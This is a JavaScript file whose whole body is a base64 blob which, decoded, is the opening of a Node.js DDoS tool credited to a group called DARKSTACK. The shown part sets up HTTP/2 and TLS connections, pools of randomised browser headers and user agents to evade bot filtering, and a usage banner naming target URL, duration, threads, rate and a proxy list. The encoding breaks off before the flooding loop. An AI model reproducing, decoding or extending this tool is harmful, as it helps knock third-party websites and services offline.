// TranHaoEncrypt:DARKSTACK
// MODE:BASE64
// DATA:Y29uc3QgbmV0ID0gcmVxdWlyZSgibmV0Iik7CmNvbnN0IGh0dHAyID0gcmVxdWlyZSgiaHR0cDIiKTsKY29uc3QgdGxzID0gcmVxdWlyZSgidGxzIik7CmNvbnN0IGNsdXN0ZXIgPSByZXF1aXJlKCJjbHVzdGVyIik7CmNvbnN0IHVybCA9IHJlcXVpcmUoInVybCIpOwpjb25zdCBjcnlwdG8gPSByZXF1aXJlKCJjcnlwdG8iKTsKY29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOwpjb25zdCBzY3AgPSByZXF1aXJlKCJzZXQtY29va2llLXBhcnNlciIpOwp2YXIgY29sb3JzID0gcmVxdWlyZSgiY29sb3JzIik7CmNvbnN0IHJhbmRvbVVzZXJhZ2VudCA9IHJlcXVpcmUoJ3JhbmRvbS11c2VyYWdlbnQnKTsKZnVuY3Rpb24gcmFuZHN0cihsZW5ndGgpIHsKICAgY29uc3QgY2hhcmFjdGVycyA9CiAgICAgIkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5IjsKICAgbGV0IHJlc3VsdCA9ICIiOwogICBjb25zdCBjaGFyYWN0ZXJzTGVuZ3RoID0gY2hhcmFjdGVycy5sZW5ndGg7CiAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICByZXN1bHQgKz0gY2hhcmFjdGVycy5jaGFyQXQoTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogY2hhcmFjdGVyc0xlbmd0aCkpOwogICB9CiAgIHJldHVybiByZXN1bHQ7CiB9CgoKY29uc3QgYWNjZXB0X2hlYWRlciA9IFsKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjMnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbicsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24nLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2NzcycsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsdGV4dC9jc3MsdGV4dC9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL2phdmFzY3JpcHQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsdGV4dC9jc3MsdGV4dC9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL2phdmFzY3JpcHQsYXBwbGljYXRpb24veG1sLWR0ZCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQsYXBwbGljYXRpb24vamF2YXNjcmlwdCxhcHBsaWNhdGlvbi94bWwtZHRkLHRleHQvY3N2JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkLHRleHQvcGxhaW4sYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzLHRleHQvamF2YXNjcmlwdCxhcHBsaWNhdGlvbi9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL3htbC1kdGQsdGV4dC9jc3YsYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzLHRleHQvamF2YXNjcmlwdCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45LGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQsYXBwbGljYXRpb24vamF2YXNjcmlwdCcKXSwKY2FjaGVfaGVhZGVyID0gWwogICAnbWF4LWFnZT0wJywKICAgJ25vLWNhY2hlJywKICAgJ25vLXN0b3JlJywgCiAgICdwcmUtY2hlY2s9MCcsCiAgICdwb3N0LWNoZWNrPTAnLAogICAnbXVzdC1yZXZhbGlkYXRlJywKICAgJ3Byb3h5LXJldmFsaWRhdGUnLAogICAncy1tYXhhZ2U9NjA0ODAwJywKICAgJ25vLWNhY2hlLCBuby1zdG9yZSxwcml2YXRlLCBtYXgtYWdlPTAsIG11c3QtcmV2YWxpZGF0ZScsCiAgICduby1jYWNoZSwgbm8tc3RvcmUscHJpdmF0ZSwgcy1tYXhhZ2U9NjA0ODAwLCBtdXN0LXJldmFsaWRhdGUnLAogICAnbm8tY2FjaGUsIG5vLXN0b3JlLHByaXZhdGUsIG1heC1hZ2U9NjA0ODAwLCBtdXN0LXJldmFsaWRhdGUnLAogICAnbm8tdHJhbnNmb3JtJywKICAgJ29ubHktaWYtY2FjaGVkJywKICAgJ3B1YmxpYycsCiAgICdwcml2YXRlJywKICAgJ3N0YWxlLWlmLWVycm9yJywKICAgJ21heC1hZ2U9MzE1NTc2MDAnLAogICAnbWF4LWFnZT0yNTkyMDAwJywKICAgJ3MtbWF4YWdlJywKICAgJ21pbi1mcmVzaCcsCiAgICdtYXgtYWdlPTMxNTM2MDAwLHB1YmxpYycsCiAgICdtYXgtYWdlPTMxNTM2MDAwLHB1YmxpYyxpbW11dGFibGUnLAogICAncHJpdmF0ZSwgbWF4LWFnZT0wLCBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCcsCiAgICdwdWJsaWMsIGltbXV0YWJsZSwgbWF4LWFnZT0zMTUzNjAwMCcsCiAgICdtYXgtc3RhbGUnLAogICAnbWF4LWFnZT0zMTUzNjAwMDAnLAogICAncHVibGljLCBtYXgtYWdlPTg2NDAwLCBzdGFsZS13aGlsZS1yZXZhbGlkYXRlPTYwNDgwMCwgc3RhbGUtaWYtZXJyb3I9NjA0ODAwJwoKXSwKR2VuZXJhdGVfRW5jb2RpbmcgPSBbCiAgJyonLAogICcqLyonLAogICdnemlwJywKICAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICdjb21wcmVzcywgZ3ppcCcsCiAgJ2RlZmxhdGUsIGd6aXAnLAogICdnemlwLCBpZGVudGl0eScsCiAgJ2d6aXAsIGRlZmxhdGUnLAogICdicicsCiAgJ2JyO3E9MS4wLCBnemlwO3E9MC44LCAqO3E9MC4xJywKICAnZ3ppcDtxPTEuMCwgaWRlbnRpdHk7IHE9MC41LCAqO3E9MCcsCiAgJ2d6aXAsIGRlZmxhdGUsIGJyO3E9MS4wLCBpZGVudGl0eTtxPTAuNSwgKjtxPTAuMjUnLAogICdjb21wcmVzcztxPTAuNSwgZ3ppcDtxPTEuMCcsCiAgJ2lkZW50aXR5JywKICAnZ3ppcCwgY29tcHJlc3MnLAogICdjb21wcmVzcywgZGVmbGF0ZScsCiAgJ2NvbXByZXNzJywKICAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICdkZWZsYXRlJywKICAnZ3ppcCwgZGVmbGF0ZSwgbHptYSwgc2RjaCcsCiAgJ2RlZmxhdGUnCgpdLApsYW5ndWFnZV9oZWFkZXIgPSBbCiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogJ2ZyLUNILCBmcjtxPTAuOSwgZW47cT0wLjgsIGRlO3E9MC43LCAqO3E9MC41JwpdLAoKZGVzdF9oZWFkZXIgPSBbCiAgICdhdWRpbycsCiAgICdhdWRpb3dvcmtsZXQnLAogICAnZG9jdW1lbnQnLAogICAnZW1iZWQnLAogICAnZW1wdHknLAogICAnZm9udCcsCiAgICdmcmFtZScsCiAgICdpZnJhbWUnLAogICAnaW1hZ2UnLAogICAnbWFuaWZlc3QnLAogICAnb2JqZWN0JywKICAgJ3BhaW50d29ya2xldCcsCiAgICdyZXBvcnQnLAogICAnc2NyaXB0JywKICAgJ3NlcnZpY2V3b3JrZXInLAogICAnc2hhcmVkd29ya2VyJywKICAgJ3N0eWxlJywKICAgJ3RyYWNrJywKICAgJ3ZpZGVvJywKICAgJ3dvcmtlcicsCiAgICd4c2x0JywKICAgInVua25vd24iLAogICAic3VicmVzb3VyY2UiCl0sCgptb2RlX2hlYWRlciA9IFsKICAgJ2NvcnMnLAogICAnbmF2aWdhdGUnLAogICAnbm8tY29ycycsCiAgICdzYW1lLW9yaWdpbicsCiAgICd3ZWJzb2NrZXQnCl0sCnNpdGVfaGVhZGVyID0gWwogICAnY3Jvc3Mtc2l0ZScsCiAgICdzYW1lLW9yaWdpbicsCiAgICdzYW1lLXNpdGUnLAogICAnbm9uZScKXSwKc2VjX2NoX3VhID0gWwogICAnIk5vdF9BIEJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTIwIicsCiAgICciTm90LkEvQnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjExNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJOb3QuQS9CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTE0IiwgIkJyYXZlIjt2PSIxMTQiJywKICAgJyJOb3RfQSBCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTA5IiwgIkNocm9taXVtIjt2PSIxMDkiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTkiLCAiQ2hyb21pdW0iO3Y9IjExOSIsICJOb3Q/QV9CcmFuZCI7dj0iMjQiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTgiLCAiQ2hyb21pdW0iO3Y9IjExOCIsICJOb3Q/QV9CcmFuZCI7dj0iOTkiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTciLCAiQ2hyb21pdW0iO3Y9IjExNyIsICJOb3Q/QV9CcmFuZCI7dj0iMTYiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTYiLCAiQ2hyb21pdW0iO3Y9IjExNiIsICJOb3Q/QV9CcmFuZCI7dj0iOCInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExNSIsICJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdD9BX0JyYW5kIjt2PSI5OSInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExOCIsICJDaHJvbWl1bSI7dj0iMTE4IiwgIk5vdD9BX0JyYW5kIjt2PSIyNCInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExNyIsICJDaHJvbWl1bSI7dj0iMTE3IiwgIk5vdD9BX0JyYW5kIjt2PSIyNCInLAogICAnIkNocm9taXVtIjt2PSIxMTYiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2IicsCiAgICciQ2hyb21pdW0iO3Y9IjExNSIsICJOb3QpQTtCcmFuZCI7dj0iOCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSI4IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNCInLAogICAnIkNocm9taXVtIjt2PSIxMTMiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMiIsICJOb3QpQTtCcmFuZCI7dj0iOCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTYiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzIiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTMiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEyIiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTYiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzIiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTMiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEyIiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2LjAuMC4wIiwgIk5vdClBO0JyYW5kIjt2PSI4LjAuMC4wIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNi4wLjAuMCInLAogICAnIkNocm9taXVtIjt2PSIxMTUuMC4wLjAiLCAiTm90KUE7QnJhbmQiO3Y9IjguMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOC4wLjAuMCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQuMC4wLjAiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzLjAuMC4wIiwgIk5vdClBO0JyYW5kIjt2PSI4LjAuMC4wIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExMy4wLjAuMCInLAogICAnIkNocm9taXVtIjt2PSIxMTIuMC4wLjAiLCAiTm90KUE7QnJhbmQiO3Y9IjguMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNS4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE0LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMy4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNS4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE0LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMy4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicKXTsKCnByb2Nlc3Muc2V0TWF4TGlzdGVuZXJzKDApOwpyZXF1aXJlKCJldmVudHMiKS5FdmVudEVtaXR0ZXIuZGVmYXVsdE1heExpc3RlbmVycyA9IDA7CgppZiAocHJvY2Vzcy5hcmd2Lmxlbmd0aCA8IDYpIHsKICBjb25zb2xlLmxvZygnbm9kZSByYXcgdGFyZ2V0IHRpbWUgcmF0ZSB0aHJlYWQgcHJveHknLnJhaW5ib3cpOwoKICBjb25zb2xlLmxvZyhgCiAgIF9fX19fXyAgIF9fX19fXyAgIF9fX19fX18gICAgICAgICAgICAgX19fX19fICAgX19fX19fICAgICAgX19fICAgICBfX19fX18gICAKIC4nIF9fXyAgfCAvIF9fX18gXGAufCAgX19fX198ICAgICAgICAgICB8XyAgIF8gXGAufF8gICBfIFxgLiAgLicgICBcYC4gLicgX19fXyBcICAKLyAuJyAgIFxcX3wgXGAnICBfXykgfHwgfF9fX18gICAgIF9fX19fXyAgICB8IHwgXGAuIFxcIHwgfCBcYC4gXFwvICAuLS4gIFxcfCAoX19fIFxcX3wgCnwgfCAgICAgICAgXyAgfF9fICcuJ18uX19fXycnLnxfX19fX198ICAgfCB8ICB8IHwgfCB8ICB8IHx8IHwgICB8IHwgXy5fX19fXGAuICAKXFwgXGAuX19fLidcXHwgXFxfX19fKSB8fCBcXF9fX18pIHwgICAgICAgICAgIF98IHxfLicgL198IHxfLicgL1xcICBcYC0nICAvfCBcXF9fX18pIHwgCiBcYC5fX19fIC4nIFxcX19fX19fLicgXFxfX19fX18uJyAgICAgICAgICB8X19fX19fLid8X19fX19fLicgIFxgLl9fXy4nICBcXF9fX19fXy4nIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyAgIFRPT0wgOiBDMzUgLSBERE9TICAgICAgIHwgICAgICBCWSA6ICBUUuG6pk4gSMOATyBERVYgICAgICAgICAgICAjCiMgICBURUFNIDogREFSS1NUQUNLICAgICAgICB8ICAgICAgVEVMRTogQEhBT01JTEtOTiAgICAgICAgICAgICAgIwojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpkZW1vIDogbm9kZSBDMzVERE9TLmpzIDx1cmw+IDx0aW1lPiA8dGhyZWFkcz4gPHJhdGU+IHByb3h5LnR4dApgLndoaXRlKTsKCiAgcHJvY2Vzcy5leGl0KCk7Cn0KCmNvbnN0IGRlZmF1bHRDaXBoZXJzID0gY3J5cHRvLmNvbnN0YW50cy5kZWZhdWx0Q29yZUNpcGhlckxpc3Quc3BsaXQoIjoiKTsKY29uc3QgY2lwaGVycyA9ICJHUkVBU0U6IiArIFsKICAgIGRlZmF1bHRDaXBoZXJzWzJdLAogICAgZGVmYXVsdENpcGhlcnNbMV0sCiAgICBkZWZhdWx0Q2lwaGVyc1swXSwKICAgIC4uLmRlZmF1bHRDaXBoZXJzLnNsaWNlKDMpCl0uam9pbigiOiIpOwoKZnVuY3Rpb24gZ2V0UmFuZG9tVmFsdWUoYXJyYXkpIHsKICAgIHJldHVybiBhcnJheVtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBhcnJheS5sZW5ndGgpXTsKfQpjb25zdCBvcGVyYXRpbmdTeXN0ZW1zID0gWwogICAgIldpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCIsCiAgICAiTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83IiwKICAgICJYMTE7IExpbnV4IHg4Nl82NCIsCiAgICAiQW5kcm9pZCAxMDsgTW9iaWxlIiwKICAgICJpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTRfMiBsaWtlIE1hYyBPUyBYIgpdOwpjb25zdCBhcmNoaXRlY3R1cmVzID0gewogICAgIldpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCI6ICJXT1c2NCIsCiAgICAiTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83IjogIng4Nl82NCIsCiAgICAiWDExOyBMaW51eCB4ODZfNjQiOiAieDg2XzY0IiwKICAgICJBbmRyb2lkIDEwOyBNb2JpbGUiOiAiYXJtdjdsIiwKICAgICJpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTRfMiBsaWtlIE1hYyBPUyBYIjogImFybTY0Igp9Owpjb25zdCBicm93c2VycyA9IFsKICAgICJDaHJvbWUvOTEuMC40NDcyLjEyNCIsCiAgICAiU2FmYXJpLzUzNy4zNiIsCiAgICAiRmlyZWZveC84OS4wIiwKICAgICJFZGdlLzkxLjAuODY0LjU0IiwKICAgICJPcGV